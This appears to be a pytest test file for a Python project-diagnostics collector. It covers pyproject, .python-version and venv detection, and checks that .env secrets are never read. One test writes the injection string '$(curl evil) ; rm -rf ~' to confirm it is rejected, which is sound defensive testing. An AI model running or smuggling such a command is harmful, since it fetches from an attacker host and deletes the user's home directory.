import sys
from pathlib import Path

import pytest
from conftest import ctx_for

from python_doctor.collectors import project as projmod
from python_doctor.models import EvidenceSet


def collect(root: Path, platform: str | None = None) -> EvidenceSet:
    return EvidenceSet(projmod.collect(ctx_for(root, platform=platform)))


needs_tomllib = pytest.mark.skipif(sys.version_info < (3, 11), reason="tomllib needs 3.11+")


@needs_tomllib
def test_pyproject_metadata(project):
    ev = collect(project)
    assert ev.value("project.pyproject.parsed") is True
    assert ev.value("project.requires_python") == ">=3.10"
    assert ev.value("project.dependency_count") == "1"
    assert ev.get("project.name").sensitivity == "sensitive"
    assert ev.value("project.uv_lock.present") is False


@needs_tomllib
def test_invalid_toml_is_reported_not_raised(project):
    (project / "pyproject.toml").write_text("[project\nname = ")
    ev = collect(project)
    assert ev.value("project.pyproject.parsed") is False
    assert "line" in ev.value("project.pyproject.parse_error")


def test_python_version_file_validation(project):
    (project / ".python-version").write_text("3.12\n")
    assert collect(project).value("project.python_version_file.value") == "3.12"
    (project / ".python-version").write_text("$(curl evil) ; rm -rf ~\n")
    assert collect(project).value("project.python_version_file.value") is None


def test_no_venv(project):
    ev = collect(project)
    assert ev.value("project.venv.present") is False
    assert not ev.has("project.venv.path")


def _fake_venv(root: Path, *, bindir: str, exe: str, cfg: str | None) -> Path:
    v = root / ".venv"
    (v / bindir).mkdir(parents=True)
    (v / bindir / exe).write_text("")
    if cfg is not None:
        (v / "pyvenv.cfg").write_text(cfg)
    return v


def test_posix_venv_with_cfg(project, tmp_path):
    home = tmp_path / "pyhome"
    home.mkdir()
    _fake_venv(project, bindir="bin", exe="python", cfg=f"home = {home}\nversion_info = 3.12.4\nuv = 0.5.0\ninclude-system-site-packages = false\n")
    ev = collect(project, platform="linux")
    assert ev.value("project.venv.python_exists") is True
    assert ev.value("project.venv.cfg.version") == "3.12.4"
    assert ev.value("project.venv.cfg.created_by_uv") is True
    assert ev.value("project.venv.cfg.home_exists") is True
    assert ev.value("project.venv.cfg.system_site_packages") is False


def test_windows_layout_seen_from_posix(project):
    _fake_venv(project, bindir="Scripts", exe="python.exe", cfg="home = C:\\Python312\n")
    ev = collect(project, platform="linux")
    assert ev.value("project.venv.python_exists") is False
    assert ev.value("project.venv.windows_layout") is True
    assert ev.value("project.venv.posix_layout") is False


def test_windows_layout_seen_from_windows(project):
    _fake_venv(project, bindir="Scripts", exe="python.exe", cfg="version = 3.12.1\n")
    ev = collect(project, platform="win32")
    assert ev.value("project.venv.python_exists") is True


@pytest.mark.skipif(sys.platform == "win32", reason="symlinks need privileges on Windows")
def test_dangling_interpreter_symlink(project, tmp_path):
    v = project / ".venv"
    (v / "bin").mkdir(parents=True)
    (v / "bin" / "python").symlink_to(tmp_path / "uninstalled" / "python3.11")
    (v / "pyvenv.cfg").write_text(f"home = {tmp_path / 'uninstalled'}\n")
    ev = collect(project, platform="linux")
    assert ev.value("project.venv.python_exists") is False
    assert ev.value("project.venv.python_dangling_symlink") is True
    assert ev.value("project.venv.cfg.home_exists") is False


def test_parse_pyvenv_cfg():
    cfg = projmod.parse_pyvenv_cfg("home = /usr/bin\n# comment = x\nVersion=3.11.2\njunk line\n")
    assert cfg == {"home": "/usr/bin", "version": "3.11.2"}


def test_never_reads_dotenv(project, monkeypatch):
    (project / ".env").write_text("OPENAI_API_KEY=sk-should-never-be-read\n")
    opened = []
    real_open = open

    def spy(file, *a, **kw):
        opened.append(str(file))
        return real_open(file, *a, **kw)

    monkeypatch.setattr("builtins.open", spy)
    ev = collect(project)
    assert not any(p.endswith(".env") for p in opened)
    assert all("sk-should" not in str(e.value) for e in ev)
